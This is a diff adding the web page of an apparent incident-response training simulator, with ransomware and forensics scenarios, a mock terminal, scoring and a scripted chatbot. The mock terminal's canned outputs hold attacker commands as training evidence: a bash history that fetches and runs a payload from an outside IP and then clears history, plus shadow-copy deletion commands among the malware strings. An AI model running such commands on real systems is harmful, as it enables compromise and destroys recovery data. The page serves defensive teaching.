+    <div class="flex-1 flex flex-col mb-4 pt-4 border-t border-brd/30 min-h-0">
+      <div class="text-[11px] text-ok uppercase tracking-widest font-semibold mb-3 flex items-center gap-1.5"><span class="material-symbols-outlined text-[14px]">history</span> Action Timeline</div>
+      <div class="overflow-y-auto pr-1 space-y-1" id="timeline">
+        <!-- Filled by JS -->
+      </div>
+    </div>
+
+    <!-- Target Hosts -->
+    <div class="flex flex-col pt-4 border-t border-brd/30">
+      <div class="text-[11px] text-txt-2 uppercase tracking-widest font-semibold mb-3 flex items-center gap-1.5"><span class="material-symbols-outlined text-[14px]">devices</span> Network Targets</div>
+      <div class="space-y-1.5">
+        <div class="flex items-center justify-between p-2 border-l-2 border-err bg-srf-1">
+          <div class="flex items-center gap-2.5">
+            <span class="material-symbols-outlined text-err text-[16px]">computer</span>
+            <span class="text-[12px] font-m text-white">WKS-07</span>
+          </div>
+          <span class="text-[10px] font-bold tracking-widest text-err uppercase">Infected</span>
+        </div>
+        <div class="flex items-center justify-between p-2 border-l-2 border-warn bg-srf-1">
+          <div class="flex items-center gap-2.5">
+            <span class="material-symbols-outlined text-warn text-[16px]">dns</span>
+            <span class="text-[12px] font-m text-txt">DC-01</span>
+          </div>
+          <span class="text-[10px] font-bold tracking-widest text-warn uppercase">At Risk</span>
+        </div>
+        <div class="flex items-center justify-between p-2 border-l-2 border-ok bg-srf-1">
+          <div class="flex items-center gap-2.5">
+            <span class="material-symbols-outlined text-ok text-[16px]">storage</span>
+            <span class="text-[12px] font-m text-txt">FS-01</span>
+          </div>
+          <span class="text-[10px] font-bold tracking-widest text-ok uppercase">Clean</span>
+        </div>
+        <div class="flex items-center justify-between p-2 border-l-2 border-ok bg-srf-1">
+          <div class="flex items-center gap-2.5">
+            <span class="material-symbols-outlined text-ok text-[16px]">shield</span>
+            <span class="text-[12px] font-m text-txt">SIEM</span>
+          </div>
+          <span class="text-[10px] font-bold tracking-widest text-ok uppercase">Online</span>
+        </div>
+      </div>
+    </div>
+  </aside>
+
+</div>
+
+<!-- ═══════════════ DEEP HUNT AI WIDGET ═══════════════ -->
+<div id="ai-fab" title="Deep Hunt AI Assistant">
+  <span class="material-symbols-outlined text-white text-3xl">smart_toy</span>
+</div>
+
+<div id="ai-chat">
+  <!-- Chat Header -->
+  <div class="flex items-center justify-between px-4 py-3 border-b border-brd/50 bg-srf-2/80">
+    <div class="flex items-center gap-2.5">
+      <div class="w-8 h-8 rounded-full bg-gradient-to-br from-pri to-purple flex items-center justify-center">
+        <span class="material-symbols-outlined text-white text-[18px]">smart_toy</span>
+      </div>
+      <div>
+        <h3 class="font-h font-bold text-sm text-white leading-none">Deep Hunt AI</h3>
+        <p class="text-[10px] text-ok mt-1 font-m uppercase tracking-widest">Active & Monitoring</p>
+      </div>
+    </div>
+    <button class="w-8 h-8 flex items-center justify-center rounded hover:bg-srf-3 transition-colors" id="ai-close-btn">
+      <span class="material-symbols-outlined text-txt-2 text-[20px]">close</span>
+    </button>
+  </div>
+  
+  <!-- Chat Body -->
+  <div class="flex-1 p-4 overflow-y-auto flex flex-col gap-1" id="ai-messages">
+    <div class="chat-msg bot">
+      Operator, I am monitoring this session. Based on the <code>ir-ransomware</code> scenario, I recommend checking process trees to rule out lateral movement. Let me know if you need assistance.
+    </div>
+  </div>
+  
+  <!-- Chat Input -->
+  <div class="p-3 border-t border-brd/50 bg-srf-1/80">
+    <div class="flex items-center gap-2 bg-bg border border-brd rounded-xl p-1.5 focus-within:border-pri/40 transition-colors">
+      <input type="text" class="flex-1 bg-transparent border-none outline-none text-sm font-b text-white px-2 placeholder:text-txt-2/40" placeholder="Ask Deep Hunt AI..." id="ai-input">
+      <button class="w-8 h-8 rounded bg-pri/10 text-pri hover:bg-pri/20 flex items-center justify-center transition-colors" id="ai-send-btn">
+        <span class="material-symbols-outlined text-[18px]">arrow_upward</span>
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════ SCRIPTS ═══════════════ -->
+<script>
+(function() {
+
+  /* ── URL-based scenario config ── */
+  const path = window.location.pathname;
+  const parts = path.split('/').filter(Boolean);
+  const simRootIndex = parts[0] === 'labs' && parts[1] === 'simulator'
+    ? 1
+    : (parts[0] === 'simulator' ? 0 : -1);
+  const simId = simRootIndex >= 0 && parts[simRootIndex + 1]
+    ? parts[simRootIndex + 1]
+    : 'ir-ransomware';
+
+  const scenarios = {
+    'soc-sim-alpha': {
+      name: 'SOC Simulator: Credential Stuffing Attack',
+      badge: 'SOC', category: 'SOC Operations',
+      difficulty: 3, duration: '45 min',
+      mitre: ['T1110','T1078','T1071'],
+      objectives: [
+        { text: 'Identify credential stuffing pattern in auth logs', pts: 150 },
+        { text: 'Isolate affected user accounts', pts: 200 },
+        { text: 'Trace attack origin IP and geolocation', pts: 250 },
+        { text: 'Submit containment report', pts: 400 },
+      ]
+    },
+    'ir-ransomware': {
+      name: 'IR: Ransomware Containment',
+      badge: 'IR', category: 'Incident Response',
+      difficulty: 4, duration: '1h 30m',
+      mitre: ['T1486','T1059','T1021'],
+      objectives: [
+        { text: 'Establish access to compromised host', pts: 100 },
+        { text: 'Collect volatile memory artifacts', pts: 200 },
+        { text: 'Identify ransomware strain and IOCs', pts: 300 },
+        { text: 'Submit incident report with recommendations', pts: 400 },
+      ]
+    },
+    'forensics-pcap': {
+      name: 'Forensics: Data Exfiltration Analysis',
+      badge: 'DFIR', category: 'Digital Forensics',
+      difficulty: 5, duration: '2h 00m',
+      mitre: ['T1041','T1567','T1048'],
+      objectives: [
+        { text: 'Open and inspect PCAP capture file', pts: 100 },
+        { text: 'Identify C2 communication channels', pts: 300 },
+        { text: 'Reconstruct exfiltrated data', pts: 300 },
+        { text: 'Build and submit forensic timeline', pts: 300 },
+      ]
+    },
+    'hunt-av-evasion': {
+      name: 'Threat Hunting: AV Evasion Tactics',
+      badge: 'HUNT', category: 'Threat Hunting',
+      difficulty: 4, duration: '1h 15m',
+      mitre: ['T1055','T1218','T1027'],
+      objectives: [
+        { text: 'Form hypothesis for evasion technique', pts: 100 },
+        { text: 'Identify LOLBin abuse in process tree', pts: 250 },
+        { text: 'Detect fileless payload execution', pts: 300 },
+        { text: 'Document findings with MITRE mapping', pts: 350 },
+      ]
+    }
+  };
+
+  const cfg = scenarios[simId] || scenarios['ir-ransomware'];
+
+  document.title = `Simulator — ${cfg.name}`;
+  document.getElementById('sim-title').textContent = cfg.name;
+  document.getElementById('sim-badge').textContent = cfg.badge;
+  document.getElementById('mission-name').textContent = cfg.name;
+  document.getElementById('mission-duration').textContent = cfg.duration;
+
+  // Difficulty dots
+  for (let i = 1; i <= 5; i++) {
+    const d = document.getElementById('diff-' + i);
+    if (i <= cfg.difficulty) d.className = 'w-1.5 h-1.5 bg-warn';
+    else d.className = 'w-1.5 h-1.5 bg-srf-3';
+  }
+
+  // MITRE tags
+  const mitreCont = document.getElementById('mitre-tags');
+  mitreCont.innerHTML = cfg.mitre.map(t => `<span class="evidence-tag border-purple/30 text-purple bg-purple/5">${t}</span>`).join('');
+
+  /* ── Objectives ── */
+  const objList = document.getElementById('obj-list');
+  const completed = new Set();
+  // Auto-complete first objective
+  completed.add(0);
+
+  function renderObjectives() {
+    objList.innerHTML = cfg.objectives.map((o, i) => {
+      const done = completed.has(i);
+      return `
+        <div class="flex items-start gap-2.5 p-2 border-l-2 ${done ? 'border-ok bg-ok/5' : 'border-brd/50 hover:bg-srf-2 transition-colors'}">
+          <span class="material-symbols-outlined text-[16px] mt-0.5 ${done ? 'text-ok' : 'text-srf-3'}">${done ? 'check_circle' : 'radio_button_unchecked'}</span>
+          <div class="flex-1 min-w-0">
+            <p class="text-[13px] ${done ? 'text-txt-2 line-through' : 'text-txt'} leading-snug">${o.text}</p>
+            <p class="text-[11px] font-m ${done ? 'text-ok' : 'text-txt-2'} mt-1">${done ? '+' : ''}${o.pts} pts</p>
+          </div>
+        </div>
+      `;
+    }).join('');
+
+    const n = completed.size;
+    const total = cfg.objectives.length;
+    const pct = Math.round((n / total) * 100);
+    document.getElementById('obj-count').textContent = `${n} / ${total}`;
+    document.getElementById('obj-pct').textContent = pct + '%';
+    document.getElementById('obj-bar').style.width = pct + '%';
+  }
+  renderObjectives();
+
+  /* ── Timer ── */
+  let secs = 0;
+  setInterval(() => {
+    secs++;
+    const h = String(Math.floor(secs / 3600)).padStart(2, '0');
+    const m = String(Math.floor((secs % 3600) / 60)).padStart(2, '0');
+    const s = String(secs % 60).padStart(2, '0');
+    document.getElementById('timer').textContent = `${h}:${m}:${s}`;
+  }, 1000);
+
+  /* ── Timeline ── */
+  const timeline = document.getElementById('timeline');
+  const timelineEntries = [];
+
+  function addTimeline(type, title, detail) {
+    const now = new Date();
+    const t = now.toTimeString().slice(0, 8);
+    const colors = { ok: 'ok', cmd: 'pri', err: 'err', info: 'txt-2', warn: 'warn', evidence: 'warn' };
+    const c = colors[type] || 'txt-2';
+
+    timelineEntries.unshift({ t, type, title, detail, c });
+    renderTimeline();
+  }
+
+  function renderTimeline() {
+    timeline.innerHTML = timelineEntries.map((e, i) => `
+      <div class="flex gap-3 ${i > 0 ? 'mt-0' : ''}">
+        <div class="flex flex-col items-center">
+          <div class="timeline-dot border-${e.c} ${e.c === 'ok' ? 'bg-ok/20' : ''}"></div>
+          ${i < timelineEntries.length - 1 ? '<div class="timeline-line flex-1"></div>' : ''}
+        </div>
+        <div class="pb-3 min-w-0">
+          <div class="flex items-center gap-2">
+            <span class="text-[11px] font-m text-txt-2">${e.t}</span>
+            <span class="text-[11px] font-bold text-${e.c}">${e.title}</span>
+          </div>
+          <p class="text-[12px] text-txt mt-0.5 break-words">${e.detail}</p>
+        </div>
+      </div>
+    `).join('');
+  }
+
+  // Initial timeline entries
+  addTimeline('ok', 'Objective Complete', 'Initial access established (+100 pts)');
+  addTimeline('cmd', 'Command', 'hostname');
+  addTimeline('cmd', 'Command', 'whoami');
+  addTimeline('info', 'Session Start', 'Connected to target environment');
+
+  /* ── Evidence ── */
+  const evidence = [];
+  const evidenceList = document.getElementById('evidence-list');
+  const evidenceCount = document.getElementById('evidence-count');
+
+  function addEvidence(name, type) {
+    const colors = { ioc: 'err', file: 'warn', finding: 'pri', flag: 'ok' };
+    evidence.push({ name, type });
+    evidenceCount.textContent = evidence.length;
+    evidenceList.innerHTML = evidence.map(e => `
+      <div class="flex items-center gap-2 p-2 rounded-lg bg-srf-2/50 mb-1.5 border border-brd/30">
+        <span class="material-symbols-outlined text-${colors[e.type] || 'txt-2'} text-sm">${e.type === 'ioc' ? 'bug_report' : e.type === 'file' ? 'description' : e.type === 'flag' ? 'flag' : 'search'}</span>
+        <span class="text-xs font-m text-white truncate flex-1">${e.name}</span>
+        <span class="evidence-tag border-${colors[e.type] || 'brd'}/30 text-${colors[e.type] || 'txt-2'} bg-${colors[e.type] || 'srf-2'}/5">${e.type}</span>
+      </div>
+    `).join('');
+  }
+
+  /* ── Score ── */
+  let score = 250;
+  function updateScore(add) {
+    score = Math.min(1000, score + add);
+    document.getElementById('score-val').textContent = score;
+    const pct = score / 1000;
+    const offset = 251 - (251 * pct);
+    document.getElementById('score-circle').setAttribute('stroke-dashoffset', offset);
+  }
+  // Initialize ring
+  updateScore(0);
+
+  /* ── Terminal ── */
+  const termOutput = document.getElementById('term-output');
+  const cmdInput = document.getElementById('cmd-input');
+  const termScroll = document.getElementById('term-scroll');
+
+  // Boot message
+  const boot = [
+    `<span class="out-info">┌──────────────────────────────────────────────────────────────┐</span>`,
+    `<span class="out-info">│           DEEP HUNT LABS — SECURE TERMINAL v3.2              │</span>`,
+    `<span class="out-info">└──────────────────────────────────────────────────────────────┘</span>`,
+    `<span class="out-dim">[sys]</span> Establishing encrypted tunnel...`,
+    `<span class="out-ok">[✓]</span> Connection established — AES-256-GCM`,
+    `<span class="out-dim">[sys]</span> Loading simulation environment...`,
+    `<span class="out-ok">[✓]</span> Environment loaded: <span class="text-white">${cfg.name}</span>`,
+    `<span class="out-warn">[!]</span> All actions are monitored and scored by AI engine`,
+    `<span class="out-dim">─────────────────────────────────────────────────────────────────</span>`,
+    `<span class="prompt-user">operator</span><span class="prompt-at">@</span><span class="prompt-host">target</span>:<span class="prompt-path">~</span><span class="prompt-dollar">$</span> <span class="text-white">whoami</span>`,
+    `operator`,
+    `<span class="prompt-user">operator</span><span class="prompt-at">@</span><span class="prompt-host">target</span>:<span class="prompt-path">~</span><span class="prompt-dollar">$</span> <span class="text-white">hostname</span>`,
+    `infected-workstation-07`,
+    ``,
+  ];
+  termOutput.innerHTML = boot.join('\n');
+
+  const responses = {
+    'help': `<span class="out-info">Available commands:</span>
+  ls, dir        List directory contents
+  cd &lt;dir&gt;       Change directory
+  cat &lt;file&gt;     Display file contents
+  ps / tasklist   List running processes
+  netstat         Network connections
+  whoami          Current user
+  hostname        Host name
+  strings &lt;f&gt;    Extract strings
+  volatility3     Memory forensics
+  yara &lt;rule&gt;     Pattern matching
+  tcpdump         Packet capture
+  collect &lt;item&gt;  Add to evidence locker
+  submit &lt;flag&gt;   Submit a flag
+  clear           Clear terminal
+  hint            Get a hint`,
+    'ls': `<span class="text-pri">Documents</span>  <span class="text-pri">Downloads</span>  <span class="text-pri">Desktop</span>  .bash_history  <span class="out-err">malware_sample.exe</span>  <span class="out-warn">ransom_note.txt</span>`,
+    'cat ransom_note.txt': `<span class="out-err">═══════════════════════════════════════════════
+         YOUR FILES HAVE BEEN ENCRYPTED
+═══════════════════════════════════════════════</span>
+
+All your important files have been encrypted with
+military-grade AES-256 encryption.
+
+To recover your files, pay <span class="out-warn">2.5 BTC</span> to:
+<span class="font-bold text-white">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</span>
+
+Contact: <span class="out-err">darkside@onion.mail</span>
+Deadline: <span class="out-warn">72 hours</span>`,
+    'cat .bash_history': `wget http://185.220.101.45/payload.exe -O /tmp/update.exe
+chmod +x /tmp/update.exe
+/tmp/update.exe --silent
+rm -f /tmp/update.exe
+history -c`,
+    'ps': `  <span class="out-dim">PID   PPID  USER       NAME</span>
+  1     0     root       systemd
+  423   1     root       sshd
+  892   423   operator   bash
+  1204  892   operator   python3
+  <span class="out-err">1567  1204  SYSTEM     ransomware.exe       ← SUSPICIOUS</span>
+  <span class="out-warn">1892  1567  SYSTEM     cmd.exe              ← CHILD</span>
+  <span class="out-warn">2103  1892  SYSTEM     powershell.exe       ← CHILD</span>`,
+    'tasklist': `  <span class="out-dim">PID   PPID  USER       NAME</span>
+  1     0     root       systemd
+  423   1     root       sshd
+  892   423   operator   bash
+  <span class="out-err">1567  1204  SYSTEM     ransomware.exe       ← SUSPICIOUS</span>
+  <span class="out-warn">2103  1892  SYSTEM     powershell.exe       ← CHILD</span>`,
+    'netstat': `<span class="out-dim">Proto  Local Address       Foreign Address        State</span>
+TCP    0.0.0.0:22          0.0.0.0:*              LISTENING
+<span class="out-err">TCP    10.0.1.7:49832      185.220.101.45:443     ESTABLISHED  ← C2</span>
+<span class="out-err">TCP    10.0.1.7:49841      91.219.29.81:8080      ESTABLISHED  ← C2</span>
+UDP    0.0.0.0:53          0.0.0.0:*              LISTENING`,
+    'pwd': `/home/operator`,
+    'id': `uid=1000(operator) gid=1000(operator) groups=1000(operator),27(sudo)`,
+    'date': new Date().toString(),
+    'uname -a': `Linux infected-workstation-07 5.15.0-generic #1 SMP x86_64 GNU/Linux`,
+    'strings malware_sample.exe': `<span class="out-dim">[extracting strings from malware_sample.exe...]</span>
+!This program cannot be run in DOS mode.
+.text
+.rdata
+<span class="out-err">darkside_ransom_v3.1</span>
+<span class="out-err">encrypt_all_files</span>
+<span class="out-warn">185.220.101.45</span>
+<span class="out-warn">91.219.29.81</span>
+bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
+AES_CBC_256
+RSA_OAEP
+<span class="out-err">shadow_copy_delete</span>
+vssadmin delete shadows /all /quiet
+wmic shadowcopy delete
+<span class="out-dim">[...342 more strings]</span>`,
+    'volatility3': `<span class="out-info">Volatility 3 Framework 2.5.0</span>
+<span class="out-dim">Usage: volatility3 -f &lt;memory_dump&gt; &lt;plugin&gt;</span>
+<span class="out-dim">Available plugins: pslist, pstree, netscan, malfind, dlllist, handles</span>
+<span class="out-dim">Memory dump available at: /evidence/memory.raw</span>`,
+    'hint': function() {
+      const hints = [
+        `<span class="out-info">[hint]</span> Try examining the ransom note: <span class="font-bold">cat ransom_note.txt</span>`,
+        `<span class="out-info">[hint]</span> Check running processes for suspicious activity: <span class="font-bold">ps</span>`,
+        `<span class="out-info">[hint]</span> Look at network connections: <span class="font-bold">netstat</span>`,
+        `<span class="out-info">[hint]</span> Extract strings from the malware: <span class="font-bold">strings malware_sample.exe</span>`,
+        `<span class="out-info">[hint]</span> Check bash history: <span class="font-bold">cat .bash_history</span>`,
+        `<span class="out-info">[hint]</span> Collect evidence with: <span class="font-bold">collect &lt;item_name&gt;</span>`,
+      ];
+      return hints[Math.floor(Math.random() * hints.length)];
+    },
+    'clear': 'CLEAR',
+  };
+
+  function prompt() {
+    return `<span class="prompt-user">operator</span><span class="prompt-at">@</span><span class="prompt-host">target</span>:<span class="prompt-path">~</span><span class="prompt-dollar">$</span>`;
+  }
+
+  function processCmd(raw) {
+    const cmd = raw.trim();
+    if (!cmd) return;
+
+    let output = '';
+    const line = `${prompt()} <span class="text-white">${cmd}</span>`;
+
+    if (cmd === 'clear') {
+      termOutput.innerHTML = '';
+      addTimeline('cmd', 'Command', 'clear');
+      return;
+    }
+
+    // Collect command
+    if (cmd.startsWith('collect ')) {
+      const item = cmd.slice(8).trim();
+      if (item) {
+        const type = item.includes('.') ? 'file' : 'ioc';
+        addEvidence(item, type);
+        output = `<span class="out-ok">[✓]</span> Evidence collected: <span class="text-white">${item}</span>`;
+        addTimeline('evidence', 'Evidence Collected', item);
+        updateScore(25);
+      } else {
+        output = `<span class="out-err">Usage: collect &lt;item_name&gt;</span>`;
+      }
+    }
+    // Submit command
+    else if (cmd.startsWith('submit ')) {
+      const flag = cmd.slice(7).trim();
+      if (flag) {
+        addEvidence(flag, 'flag');
+        output = `<span class="out-ok">[✓]</span> Flag submitted: <span class="text-white">${flag}</span>\n<span class="out-dim">[ai]</span> Processing submission...`;
+        addTimeline('ok', 'Flag Submitted', flag);
+        updateScore(50);
+      } else {
+        output = `<span class="out-err">Usage: submit &lt;flag&gt;</span>`;
+      }
+    }
+    // Known responses
+    else if (responses[cmd]) {
+      const r = responses[cmd];
+      output = typeof r === 'function' ? r() : r;
+      addTimeline('cmd', 'Command', cmd);
+    }
+    else if (cmd.startsWith('cd ')) {
+      output = '';
+      addTimeline('cmd', 'Command', cmd);
+    }
+    else {
+      output = `<span class="out-err">bash: ${cmd.split(' ')[0]}: command not found</span>\n<span class="out-dim">Type 'help' for available commands</span>`;
+      addTimeline('err', 'Error', `Unknown: ${cmd}`);
+    }
+
+    termOutput.innerHTML += '\n' + line + (output ? '\n' + output : '') + '\n';
+    termScroll.scrollTop = termScroll.scrollHeight;
+  }
+
+  cmdInput.addEventListener('keydown', e => {
+    if (e.key === 'Enter') {
+      processCmd(cmdInput.value);
+      cmdInput.value = '';
+    }
+  });
+
+  // Focus terminal on click
+  document.getElementById('term').addEventListener('click', () => cmdInput.focus());
+  document.getElementById('btn-clear').addEventListener('click', () => { termOutput.innerHTML = ''; });
+
+  /* ── Tabs ── */
+  document.querySelectorAll('.tab-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+      btn.classList.add('active');
+      document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
+      if (btn.dataset.tab === 'terminal') setTimeout(() => cmdInput.focus(), 50);
+    });
+  });
+
+  /* ── Response bar submit ── */
+  const respInput = document.getElementById('response-input');
+  document.getElementById('submit-btn').addEventListener('click', () => {
+    const val = respInput.value.trim();
+    if (val) {
+      addEvidence(val, 'flag');
+      addTimeline('ok', 'Submitted', val);
+      updateScore(50);
+      respInput.value = '';
+    }
+  });
+  respInput.addEventListener('keydown', e => {
+    if (e.key === 'Enter') document.getElementById('submit-btn').click();
+  });
+
+  /* ── Fullscreen ── */
+  document.getElementById('fs-btn').addEventListener('click', () => {
+    if (!document.fullscreenElement) document.documentElement.requestFullscreen();
+    else document.exitFullscreen();
+  });
+
+  /* ── Hints button ── */
+  document.getElementById('hints-btn').addEventListener('click', () => {
+    const hint = typeof responses['hint'] === 'function' ? responses['hint']() : '';
+    termOutput.innerHTML += '\n' + hint + '\n';
+    termScroll.scrollTop = termScroll.scrollHeight;
+    addTimeline('info', 'Hint Used', 'Requested hint (-10 pts)');
+    updateScore(-10);
+  });
+  /* ── Drawer Toggles ── */
+  const leftDrawer = document.getElementById('left-sidebar');
+  const rightDrawer = document.getElementById('right-sidebar');
+  const btnToggleLeft = document.getElementById('btn-toggle-left');
+  const btnToggleRight = document.getElementById('btn-toggle-right');
+
+  // Start with left drawer open for context
+  setTimeout(() => leftDrawer.classList.add('open'), 500);
+
+  btnToggleLeft.addEventListener('click', () => {
+    leftDrawer.classList.toggle('open');
+  });
+
+  btnToggleRight.addEventListener('click', () => {
+    rightDrawer.classList.toggle('open');
+  });
+
+  /* ── Deep Hunt AI Chat Logic ── */
+  const aiFab = document.getElementById('ai-fab');
+  const aiChat = document.getElementById('ai-chat');
+  const aiClose = document.getElementById('ai-close-btn');
+  const aiInput = document.getElementById('ai-input');
+  const aiSend = document.getElementById('ai-send-btn');
+  const aiMessages = document.getElementById('ai-messages');
+
+  const toggleAiChat = () => {
+    const isActive = aiChat.classList.toggle('active');
+    if (isActive) setTimeout(() => aiInput.focus(), 100);
+  };
+
+  aiFab.addEventListener('click', toggleAiChat);
+  aiClose.addEventListener('click', toggleAiChat);
+
+  const addMsg = (sender, text) => {
+    const el = document.createElement('div');
+    el.className = 'chat-msg ' + sender;
+    el.innerHTML = text;
+    aiMessages.appendChild(el);
+    aiMessages.scrollTop = aiMessages.scrollHeight;
+  };
+
+  const handleAiSend = () => {
+    const txt = aiInput.value.trim();
+    if (!txt) return;
+    
+    addMsg('user', txt);
+    aiInput.value = '';
+    
+    // Simulate thinking delay
+    setTimeout(() => {
+      let reply = "I analyzed that. Your approach is valid, but consider checking the <code>.bash_history</code> file or collecting PCAP traces for more concrete evidence.";
+      
+      if (txt.toLowerCase().includes("help") || txt.toLowerCase().includes("hint") || txt.toLowerCase().includes("how")) {
+         reply = "Try focusing on the <code>lsass.exe</code> process for potential credential dumping, or examine the active TCP connections to the C2 IP.";
+         updateScore(-5); // Slight penalty for asking AI for direct answers
+         addTimeline('info', 'AI Assist', 'Requested deep hint from AI');
+      } else if (txt.toLowerCase().includes("stuck")) {
+         reply = "Don't panic. Check your Evidence Locker. Have you collected the ransomware executable and checked its strings?";
+      }
+
+      addMsg('bot', reply);
+    }, 1200);
+  };
+
+  aiSend.addEventListener('click', handleAiSend);
+  aiInput.addEventListener('keydown', e => {
+    if (e.key === 'Enter') handleAiSend();
+  });
+
+})();
+</script>
+
+</body>
+</html>
